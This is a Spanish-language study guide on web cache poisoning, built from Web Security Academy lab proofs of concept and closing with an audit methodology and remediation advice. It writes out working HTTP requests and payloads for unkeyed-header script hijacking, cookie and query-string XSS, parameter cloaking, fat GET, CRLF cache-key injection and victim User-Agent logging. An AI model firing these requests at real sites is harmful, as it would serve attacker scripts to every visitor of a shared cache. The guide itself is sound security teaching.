
---
Tags: #headers #cabeceras #host #burpsuite #param-miner #poisoning #cache #xss

---
# Índice

[[#Introducción y Conceptos Clave]]
	
[[#Tabla de Referencia de Cabeceras Especiales]]
	
[[#1. Poisoning con Header No Indexado (Unkeyed Header)]]
	
[[#2. Poisoning con Cookie No Indexada]]
	
[[#3. Poisoning con Múltiples Headers (Chaining)]]
	
[[#4. Poisoning Dirigido con Header Desconocido (Vary User-Agent)]]
	
[[#5. Poisoning con Query String/Param No Indexados]]
	
[[#6. Parameter Cloaking (Ocultación de Parámetros)]]
	
[[#7. Poisoning con Petición GET Anómala (Fat GET)]]
	
[[#8. Normalización de URL]]
	
[[#9. Poisoning para XSS DOM (Caché Estricta)]]
	
[[#10. Combinación de Vulnerabilidades (Chaining)]]
	
[[#11. Inyección en Clave de Caché (Key Injection)]]
	
[[#12. Poisoning de Caché Interna]]
	
[[#Resumen para tus Apuntes (Tabla de Cabeceras Avanzadas)]]
	
[[#Metodología de Auditoría Paso a Paso]]
	[[#1. Reconocimiento de la Infraestructura de Caché]]
	[[#2. Detección de "Unkeyed Inputs" (Entradas no indexadas)]]
	[[#3. Evaluación del Impacto (El Payload)]]
	[[#4. Ejecución del Envenenamiento]]
	
[[#Prevención y Remediación (Para el Reporte)]]


---

### Introducción y Conceptos Clave

El **Web Cache Poisoning** ocurre cuando un atacante envía una petición con una entrada maliciosa (un "input unkeyed" o no indexado) que el servidor backend procesa e incluye en la respuesta, pero que el sistema de caché **ignora** al generar la "clave de caché" (cache key).

1. **Cache Key:** Normalmente compuesta por la línea de petición (URL) y el `Host`. Si cambias esto, la caché ve una petición distinta.
    
2. **Unkeyed Input:** Cabeceras, cookies o parámetros que la caché ignora. Si cambias esto, la caché cree que es la _misma_ petición que una legítima.
    
3. **El Objetivo:** Lograr que la respuesta maliciosa generada por tu input se guarde en la caché y sea servida a usuarios legítimos.
    

---

### Tabla de Referencia de Cabeceras Especiales

En tus apuntes has utilizado varias cabeceras críticas. Aquí tienes una referencia técnica de su función en la explotación:

|**Cabecera / Parámetro**|**Función Legítima**|**Uso en Explotación (Offensive)**|
|---|---|---|
|**`X-Forwarded-Host`**|Indica el host original solicitado por el cliente cuando pasa por un proxy inverso.|**Sobrescribir el host:** Obliga al backend a generar enlaces o scripts apuntando a tu servidor malicioso en lugar del legítimo.|
|**`X-Forwarded-Scheme`**|Indica el protocolo original (http/https).|**Forzar redirecciones:** Al cambiarlo a `http` en un sitio `https`, el servidor puede intentar redirigir (301/302), permitiendo capturar esa redirección en caché.|
|**`X-Host`**|Cabecera personalizada o de depuración (no estándar).|**Inyección oculta:** A menudo usada por frameworks internos para definir el host base. Ideal si `X-Forwarded-Host` está bloqueado.|
|**`Vary`**|Instruye a la caché sobre qué cabeceras hacen que la respuesta varíe (ej. `User-Agent`).|**Targeting:** Si la caché varía por `User-Agent`, debes envenenar la caché específica para el navegador de la víctima, no la global.|
|**`X-Original-Url`**|Usada por frameworks (como Symfony o ASP.NET) para sobreescribir la ruta solicitada.|**Bypass de Cache Key:** Permite acceder a una ruta distinta a la que ve la caché, confundiendo al mecanismo de almacenamiento.|
|**`Pragma: x-get-cache-key`**|Cabecera de depuración (común en Akamai).|**Reconocimiento:** Permite ver en la respuesta qué elementos forman exactamente la "Cache Key". Vital para ataques complejos.|

---

### 1. Poisoning con Header No Indexado (Unkeyed Header)

Esta es la forma más clásica de WCP. La caché confía en que el `Host` es la clave, pero el backend usa `X-Forwarded-Host` para construir rutas de recursos estáticos.

**Discovery:**

Utilizamos la extensión **Param Miner** de Burp Suite ("Guess headers"). Si la respuesta varía o refleja el valor de una cabecera inusual sin que cambie la respuesta de caché (cache hit/miss), es un candidato.

**Análisis de tu PoC:**

Tu petición manipula el origen de los scripts.

```HTTP
GET / HTTP/2
Host: 0a310008032a1df880accb2e006b0085.web-security-academy.net
X-Forwarded-Host: exploit-0a4c00a703921d308064ca6801ac005b.exploit-server.net
```

**Explicación de la Explotación:**

1. El backend recibe la petición y ve `X-Forwarded-Host`.
    
2. Genera el HTML usando ese valor para construir la ruta del script `tracking.js`.
    
3. **La vulnerabilidad:** La caché (Varnish/CDN) **no incluye** `X-Forwarded-Host` en su llave. Solo mira `GET /` y el `Host` principal.
    
4. La caché guarda tu respuesta maliciosa.
    
5. Cualquier usuario que pida `GET /` recibirá el HTML con tu script:
    
```HTML
<script src="//exploit-0a4c.../tracking.js"></script>
```
	
---

### 2. Poisoning con Cookie No Indexada

A veces, las cookies se usan para renderizar contenido (como preferencias de usuario) pero no forman parte de la cache key (para ahorrar espacio en caché).

**Discovery:**

Param Miner ("Guess cookies"). Buscamos cookies que se reflejen en la respuesta pero que, al cambiarlas, la caché siga sirviendo el contenido como si fuera para cualquier usuario.

**Análisis de tu PoC:**

```HTTP
GET / HTTP/2
Cookie: fehost=a"}</script><img src=0 onerror=alert(1)>
```

**Explicación de la Explotación:**

1. Identificas que la cookie `fehost` se refleja dentro de un objeto JSON en el HTML: `data = {"frontend":"[VALOR]"}`.
    
2. **Rompimiento de contexto:** Tu payload `a"}</script>` cierra el string JSON, cierra el objeto y cierra la etiqueta script.
    
3. **Inyección XSS:** Inmediatamente inyectas `<img src=0 onerror=alert(1)>`.
    
4. Al estar la cookie "unkeyed", la caché guarda este HTML roto y malicioso. Cuando otro usuario entra (incluso sin esa cookie), recibe tu XSS.
    

---

### 3. Poisoning con Múltiples Headers (Chaining)

A veces no podemos lograr un XSS directo, pero podemos secuestrar una redirección.

**Discovery:**

Requiere identificar dos comportamientos:

1. Una cabecera que fuerce una redirección (ej. `X-Forwarded-Scheme: http` en un sitio HTTPS suele forzar un 301 a HTTPS).
    
2. Una cabecera que controle el destino de esa redirección (`X-Forwarded-Host`).
    

**Análisis de tu PoC:**

Estás atacando un recurso JS (`/resources/js/tracking.js`).

```HTTP
GET /resources/js/tracking.js HTTP/2
X-Forwarded-Scheme: hola  <-- (Valor inválido o http fuerza al backend a redirigir)
X-Forwarded-Host: exploit-0a28...
```

**Explicación de la Explotación:**

1. El backend piensa: "El usuario entró por protocolo inseguro (o desconocido), debo redirigirlo a la versión segura".
    
2. Para construir la URL de destino, usa el host que cree que es el correcto: tu `X-Forwarded-Host`.
    
3. Respuesta del servidor (que se cachea):
    
    `Location: https://exploit-0a28.../resources/js/tracking.js`
    
4. **Impacto:** Cuando la página legítima intente cargar el script `tracking.js`, la caché responderá con un 302 Redirect hacia **tu** servidor. El navegador de la víctima irá a tu servidor a buscar el JS y ejecutará tu código.
    

---

### 4. Poisoning Dirigido con Header Desconocido (Vary: User-Agent)

Este es un escenario avanzado. Si la respuesta contiene `Vary: User-Agent`, significa que la caché guarda una copia diferente de la web para cada navegador (Chrome, Firefox, iPhone, etc.).

> **Concepto Crítico:** Si envenenas la caché usando tu navegador (ej. Chrome), solo afectarás a usuarios de Chrome. Si la víctima usa Firefox, estará a salvo.

**Discovery:**

Param Miner encuentra la cabecera oculta `X-Host`.

**Análisis de tu PoC:**

Tuviste que hacer un ataque en dos pasos (Recon + Exploit):

1. **Fase de Reconocimiento (Loguear a la víctima):**
    
    Encontraste un XSS reflejado o un punto de inyección HTML que permitía cargar una imagen desde tu servidor.
    
	```HTML
	<img src="https://mi-exploit-server.com/logger">
	```
	
	   Colocaste esto en un comentario. Cuando la víctima lo ve, su navegador hace una petición a tu servidor. En tus logs (Access Log), verás el `User-Agent` exacto de la víctima.
    
2. **Fase de Poisoning (Targeting):**
    
    Usas ese User-Agent específico en tu petición de ataque.
    
    ```HTTP
    GET / HTTP/1.1
    User-Agent: Mozilla/5.0 (Victim) ... <-- UA robado de la víctima
    X-Host: exploit-0a24... <-- Payload
    ```
    

**Explicación:**

Al coincidir el User-Agent, envenenas el "bucket" de caché específico que compartes con la víctima. El servidor toma `X-Host`, lo usa para importar un script (en este caso un `alert(document.cookie)`), y lo guarda solo para ese User-Agent.

---

### 5. Poisoning con Query String / Param No Indexados

Las configuraciones de caché agresivas a menudo ignoran la query string completa (`GET /?q=...` se guarda como `GET /`) o parámetros específicos de rastreo (como `utm_content`, `utm_source`, etc.) para mejorar el rendimiento.

**Discovery:**

1. **Query String completa:** Añades `?canary=1` y ves si la respuesta es un "Cache Hit" de la página original. Si es así, la query string es ignorada.
    
2. **Parámetro específico:** Param Miner prueba parámetros comunes (`utm_`, `gclid`).
    

**Análisis de tus PoCs:**

**Caso A: Query String completa (`?returnpath`)**

```HTTP
GET /?returnpath=a'/><img+src%3d0+onerror%3dalert(1)> HTTP/2
```

Aquí la caché ignora todo después del `?`, pero el backend usa `returnpath` para generar un `<link rel="canonical">`.

- **Payload:** Rompes el atributo `href` con `'/>` e inyectas la etiqueta `img`.
    
- **Resultado:** Cualquier usuario que acceda a la Home, recibirá tu inyección porque la caché sirve la misma respuesta para `/` que para `/?returnpath=...`.
    

**Caso B: Parámetro Específico (`utm_content`)**

```HTTP
GET /?utm_content='/><script>alert(0)</script> HTTP/2
```

Similar al anterior, pero más sutil. La caché podría respetar otros parámetros, pero está configurada explícitamente para ignorar `utm_content` (muy común en CDNs para analíticas). El backend, sin embargo, refleja su valor ciegamente.

---

### 6. Parameter Cloaking (Ocultación de Parámetros)

Esta técnica se basa en que la caché y el backend no se ponen de acuerdo sobre dónde empiezan y terminan los parámetros.

**El Concepto:**

La mayoría de las cachés consideran que el delimitador de parámetros es `&`. Sin embargo, algunos frameworks (como Ruby on Rails o Java) aceptan `;` como separador.

**Análisis de tu PoC:**

```HTTP
GET /js/geolocate.js?callback=setCountryCookie&utm_content=a;callback=alert(1)
```

**Explicación de la Explotación:**

| **Componente**       | **Interpretación de la Caché** | **Interpretación del Backend**          |
| -------------------- | ------------------------------ | --------------------------------------- |
| `callback`           | `setCountryCookie`             | `setCountryCookie` (Primer valor)       |
| `utm_content`        | `a;callback=alert(1)`          | `a`                                     |
| **Parámetro Oculto** | **(No existe)**                | **`callback=alert(1)`** (Segundo valor) |

1. **Caché:** Ve un parámetro `utm_content` (que está excluido/unkeyed) con un valor extraño. Como está excluido, lo ignora para la clave de caché. Guarda la respuesta asociada a `geolocate.js?callback=setCountryCookie`.
    
2. **Backend:** Ve dos parámetros `callback`. El último gana (`alert(1)`).
    
3. **Resultado:** El backend genera el JS con `alert(1)`. La caché lo guarda creyendo que es la versión segura. El usuario pide la URL limpia y recibe el malware.
    

---

### 7. Poisoning con Petición GET Anómala (Fat GET)

Este es un caso extremo de "Parameter Cloaking". Aunque `GET` no debería llevar cuerpo (body), algunos frameworks lo procesan si lo reciben.

**Análisis de tu PoC:**

```HTTP
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
...
Content-Length: 19

callback=alert(1)
```

**Explicación:**

- **La Caché:** Solo mira la URL (`query string`). No mira el cuerpo de un GET.
    
- **El Backend:** Es "amable" y lee el cuerpo, encontrando un parámetro `callback` que sobrescribe al de la URL.
    
- **Detección:** Param Miner prueba a enviar cuerpos en peticiones GET. Si la respuesta cambia pero la caché la sirve para peticiones sin cuerpo, es vulnerable.
    

---

### 8. Normalización de URL

Este ataque explota cómo los navegadores codifican (encode) los caracteres especiales frente a cómo Burp Suite puede enviarlos "crudos" (raw).

**Análisis de tu PoC:**

Envías una petición con `</p>` directamente en la URL.

```HTTP
GET /error</p><script>alert(1)</script> HTTP/2
```

**Explicación de la Explotación:**

1. **Envío (Atacante):** Usas Burp para enviar los caracteres `<` y `>` sin codificar.
    
2. **Backend:** Refleja la URL tal cual en el mensaje de error "Not Found: /error...".
    
3. **Caché:** Guarda esa respuesta exacta asociada a esa URL.
    
4. **Víctima:** Visita `https://web.com/error</p><script>...`.
    
5. **El Truco:** El navegador de la víctima codificará la URL a `/error%3C%2F...`. La caché normaliza (decodifica) la petición entrante para ver si tiene una coincidencia.
    
    - Petición Víctima: `/error%3C...` -> Normalización Caché -> `/error<...`
        
    - ¡Coincidencia! La caché devuelve la respuesta guardada (que contiene el payload reflejado sin codificar). El navegador ejecuta el script.
        

---

### 9. Poisoning para XSS DOM (Caché Estricta)

Cuando no puedes cambiar el JS directamente porque la caché es estricta, atacas los **datos** que ese JS consume.

**Análisis de tu PoC:**

El script legítimo hace esto:

```JavaScript
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
```

Tú envenenas `data.host` usando `X-Forwarded-Host`.

**Explicación:**

1. Consigues que la caché guarde `data = {"host": "tu-servidor-exploit"}`.
    
2. Cuando la víctima carga la página, el script legítimo construye la URL apuntando a TU servidor.
    
3. El `fetch()` del navegador pide el JSON a tu servidor.
    
4. **Punto Crítico (CORS):** Para que el navegador acepte leer el JSON de un dominio externo, tu servidor exploit DEBE tener la cabecera:
    
    `Access-Control-Allow-Origin: *`
    
5. Tu JSON malicioso contiene HTML (`<img src=x...>`) que el script legítimo inserta en el DOM mediante `innerHTML` o `appendChild`.
    

---

### 10. Combinación de Vulnerabilidades (Chaining)

Este es el ataque más sofisticado de tus apuntes. Requiere encadenar múltiples fallos para lograr el objetivo.

**Flujo del Ataque:**

1. **Envenenar la traducción (JSON):** Manipulas `/?localized=1` para que cargue las traducciones desde tu servidor (similar al punto 9).
    
2. **Redirigir a la víctima:** Necesitas que la víctima, al entrar a la home (`/`), cargue la versión "español" (que está envenenada), aunque su idioma sea inglés.
    

**Explicación de la Cabecera `X-Original-Url` (Tu pregunta específica):**

> **¿Qué es `X-Original-Url`?**
> 
> Es una cabecera usada por frameworks (como Symfony o ASP.NET) para decirle a la aplicación: "Ignora la URL real que te ha llegado, procesa ESTA ruta en su lugar".

> **¿Por qué la usas aquí?**
> 
> Para "desincronizar" la caché del backend.
> 
> - **Caché ve:** `GET /` (Limpio).
>     
> - **Backend ve:** `X-Original-Url: /setlang\es` (Petición de cambio de idioma).
>     

> **¿Por qué `/setlang\es` (barra invertida) y no `/setlang/es`?**
> 
> Esto se llama **Path Normalization Bypass**.
> 
> Si usas `/setlang/es`, es posible que la caché detecte que es una ruta diferente o que no coincida con la home.
> 
> - Muchos servidores normalizan `\` convirtiéndolo en `/`.
>     
> - Pero la caché a menudo ve `\` como un carácter normal de un nombre de archivo, no como un separador de directorios.
>     
> - **Resultado:** Engañas a la caché para que crea que es un archivo estático o una ruta válida asociada a la Home, mientras el backend ejecuta la lógica de "Set Language".
>     

---

### 11. Inyección en Clave de Caché (Key Injection)

Este ataque ocurre cuando la aplicación refleja cabeceras en la respuesta que, a su vez, forman parte de la clave de caché.

**Análisis de tus PoCs (El uso de `$$` y `Pragma`):**

- Petición 1: El "Envenenamiento" (Crafting la llave)

```HTTP
GET /js/localize.js?lang=en?utm_content=x&cors=1 HTTP/2
Host: 0ab3...
Pragma: x-get-cache-key
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

- **¿Por qué usas `Origin` aquí?** En este escenario, el servidor está configurado para que la cabecera `Origin` sea **parte de la clave de caché (Keyed)**. El servidor dice: "Si el Origin cambia, la respuesta puede cambiar, así que inclúyelo en la llave".
    
- **La Inyección:** Al meter `%0d%0a` (saltos de línea CRLF) dentro del `Origin`, estás haciendo un **Header Injection en la propia base de datos de la caché**. Estás forzando a la caché a escribir una llave que, al final, contiene el cuerpo `alert(1)`. Los `$$$$` sirven para "cerrar" o "romper" la estructura que el servidor espera, asegurando que tu carga útil se quede grabada.


Deteccion de origin:

##### 1. El método de la "Variación de Caché" (Manual)

Es la prueba de fuego. Si una cabecera es **Keyed**, al cambiar su valor, la caché debería tratar la petición como un objeto totalmente nuevo.

1. Envías tu petición original con `Origin: ejemplo.com`. Recibes un `X-Cache: miss`.
    
2. La envías de nuevo. Recibes un `X-Cache: hit`. (Ya está en caché).
    
3. **La prueba:** Cambias el Origin a `Origin: atacante.com`.
    
    - **Si recibes un `X-Cache: miss`**: ¡BINGO! El servidor de caché ha visto que el Origin es distinto y ha decidido que no puede usar la versión guardada. Esto confirma que el `Origin` **forma parte de la llave**.
        
    - Si recibes un `X-Cache: hit`: El Origin es **unkeyed** (la caché lo ignora).
        

##### 2. Uso de la cabecera `Vary`

A veces el servidor te da una pista legal en la respuesta. Si en los headers de respuesta ves esto: `Vary: Origin, User-Agent`

Eso es el servidor diciéndole a la caché: _"Oye, el contenido de este JS puede cambiar dependiendo de quién sea el Origin, así que crea una copia distinta para cada uno"_. Cualquier cabecera que aparezca en `Vary` es, por definición, parte de la **Cache Key**.

##### 3. Inferencia mediante el parámetro `cors=1`

Aquí es donde entra tu conocimiento de **Full Stack Developer (DAW)**. ¿Por qué alguien pondría un parámetro `cors=1` en un archivo JS?

- **Lógica:** Si `cors=1`, el servidor probablemente espera una cabecera `Origin` para devolver las cabeceras `Access-Control-Allow-Origin`.
    
- **Pentester mindset:** Si el backend cambia su respuesta basándose en el `Origin` (para permitir CORS), la caché **está obligada** a incluir el `Origin` en la llave para no servirle a un usuario A la cabecera de CORS del usuario B.
    

Si ves parámetros como `cors`, `secure`, o `v=...`, sospecha inmediatamente de las cabeceras relacionadas (`Origin`, `X-Forwarded-Proto`, etc.).

- Petición 2: El "Check" (Verificando el veneno)

```HTTP
GET /js/localize.js?lang=en?utm_content=x&cors=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$ HTTP/2
Host: 0ab3...
Pragma: x-get-cache-key
```

- **¿Qué hace `Pragma: x-get-cache-key`?** Es tu "rayos X". Sin esta cabecera, el servidor solo te daría el JS. Con ella, el servidor te confiesa: _"Mira, este archivo lo tengo guardado bajo la llave: `/js/localize.js...$$origin=...`"_.
    
- **¿Para qué sirve esta petición?** La usas para confirmar que la caché ha mordido el anzuelo. Estás pidiendo el recurso usando la **llave exacta que acabas de inventar**. Si el servidor te responde con un `X-Cache: hit` y ves tu `alert(1)` en el cuerpo, el veneno ya está en la estantería de la caché, listo para ser servido.
    

- Petición 3: El "Trigger" (Cazando a la víctima)

```HTTP
GET /login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%25208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Host: 0ab3...
```

- **¿Por qué `/login` sin la barra final?** Esto es brillante. Al pedir `/login`, el servidor responde con un **301/302 Redirect** hacia `/login/`. En ese proceso de redirección, el servidor suele "limpiar" o normalizar la URL, pero a menudo **mantiene los parámetros** que enviaste.
    
- **El papel de `utm_content`:** Como este parámetro es **unkeyed** (la caché lo ignora para la llave, pero el backend lo lee), lo usas como un "caballo de Troya". La víctima entra en una URL que parece inofensiva, pero debido a cómo el servidor gestiona los `$$` y los parámetros unkeyed, el navegador de la víctima acaba pidiendo el recurso que coincide exactamente con la **llave envenenada** que creaste en el paso 1.
---

### 12. Poisoning de Caché Interna

A diferencia de CDNs externas (Cloudflare), estas cachés viven dentro del servidor de aplicaciones (ej. Varnish local, caché de Django/Rails).

**Explicación:**

Estas cachés suelen ser más efímeras y no respetan las mismas reglas que las CDNs. A menudo cachean fragmentos de la página (fragments), no la página entera.

**¿Cómo explotarlo y detectarlo?**

1. **Timing / Race Condition:** Como indicas, mandas peticiones en bucle.
    
    - Si la caché dura 10 segundos, tienes una ventana de milisegundos cada 10 segundos para ser el primero en llegar justo cuando la caché expira. Tu petición maliciosa (con `X-Forwarded-Host`) regenerará el contenido.
        
2. **Detección sin fuerza bruta (Buster):**
    
    - Usa la extensión "Cache Cloaking" o técnicas de **Cache Buster** dinámico (añadir `?cb=1`, `?cb=2` incrementales) para ver si cada nueva query string genera una respuesta fresca que refleja tu cabecera.
        
    - Si siempre se refleja en una URL nueva, pero a veces no en la URL base, hay una caché interna.
        

---

### Resumen para tus Apuntes (Tabla de Cabeceras Avanzadas)

Aquí tienes la tabla que me pediste para agrupar las cabeceras explicadas en estas dos partes.

|**Cabecera**|**Tipo**|**Función en Explotación**|
|---|---|---|
|`X-Forwarded-Host`|Estándar|Redirigir cargas de scripts/imágenes a servidor atacante.|
|`X-Forwarded-Scheme`|Estándar|Forzar redirecciones 301/302 para cachearlas.|
|`X-Original-Url`|Framework|Sobrescribir la ruta que ve el backend (Bypass de reglas).|
|`X-Rewrite-Url`|Framework|Similar a `X-Original-Url` (común en ASP.NET).|
|`X-Host`|Custom|Alternativa a `X-Forwarded-Host` si este está bloqueado.|
|`Pragma: x-get-cache-key`|Debug|Revela los componentes de la llave de caché (Akamai).|
|`Vary`|Respuesta|Indica qué cabecera del cliente segmenta la caché (Targeting).|

---

### Metodología de Auditoría: Paso a Paso

Como experto en seguridad ofensiva, no puedes disparar a ciegas. Sigue este flujo lógico:

#### 1. Reconocimiento de la Infraestructura de Caché

Antes de lanzar payloads, identifica a qué te enfrentas.

- **Cabeceras de Respuesta:** Busca `X-Cache: hit/miss`, `Age`, `Cache-Control`, `CF-Cache-Status` (Cloudflare).
    
- **Identificación de la Key:** Envía dos peticiones idénticas. Si la segunda tiene `X-Cache: hit`, ya sabes que esa URL se cachea.
    
- **Uso de Debug Headers:** Prueba siempre `Pragma: x-get-cache-key` o `X-Cache-Debug: 1`.
    

#### 2. Detección de "Unkeyed Inputs" (Entradas no indexadas)

Utiliza **Param Miner**. Es la herramienta estándar.

- **Fuerza Bruta de Cabeceras:** Busca cabeceras como `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`.
    
- **Detección de Cambios:** Si al añadir `X-Forwarded-Host: test.com` la respuesta cambia (ej. un link cambia a `test.com`) pero la cabecera `X-Cache` sigue dando `HIT`, has encontrado un **Unkeyed Input**.
    

#### 3. Evaluación del Impacto (El Payload)

Una vez que controlas un input que se refleja en una respuesta cacheada:

- **Reflexión en HTML:** Intenta inyectar etiquetas (`<script>`, `<img>`).
    
- **Reflexión en JS:** Si el input cae dentro de un script, intenta romper el contexto (`'; alert(1)//`).
    
- **Redirecciones:** Si controlas el Host, intenta redirigir a un servidor externo donde controles el contenido.
    

#### 4. Ejecución del Envenenamiento

- **Limpieza de Caché:** Si puedes, usa un "Cache Buster" (`?cb=123`) para trabajar sobre una copia fresca sin molestar a otros usuarios durante las pruebas.
    
- **Timing:** Asegúrate de enviar tu petición maliciosa justo cuando el `Age` de la caché sea cercano al `max-age` (cuando la caché va a expirar).
    

---

### Checklist de Verificación Rápida

|**Fase**|**Acción**|**¿Qué buscar?**|
|---|---|---|
|**Identificación**|¿Hay caché?|Cabeceras `X-Cache`, `Server: Varnish`, `Via`.|
|**Búsqueda**|¿Hay inputs ocultos?|Usa Param Miner (Headers, Cookies, Params).|
|**Análisis**|¿Se refleja el input?|Busca tu payload en el código fuente de la respuesta.|
|**Confirmación**|¿Es "Unkeyed"?|Cambia el input; si la caché da `HIT` con el valor viejo, es vulnerable.|
|**Explotación**|¿Hay XSS o Redirect?|Intenta ejecutar JS o redirigir recursos estáticos (.js, .css).|

---

### Prevención y Remediación (Para el Reporte)

Si encuentras esto en una auditoría real, estas son las recomendaciones que debes dar:

1. **Regla de Oro:** Nunca confíes en los datos de las cabeceras `X-Forwarded-*` para generar contenido dinámico en la página.
    
2. **Indexación Estricta:** Si una cabecera o parámetro afecta a la respuesta, **debe** formar parte de la _Cache Key_.
    
3. **Deshabilitar Cabeceras No Usadas:** Si el servidor no necesita `X-Forwarded-Host`, bloquéalo a nivel de WAF o Proxy.
    
4. **Uso de Vary:** Configura correctamente la cabecera `Vary` para separar cachés por `User-Agent` o `Cookie` si es estrictamente necesario, aunque esto reduce la eficiencia de la caché.
    
5. **Caché de Errores:** Evita cachear respuestas con estados de error (404, 500) donde se reflejen inputs del usuario.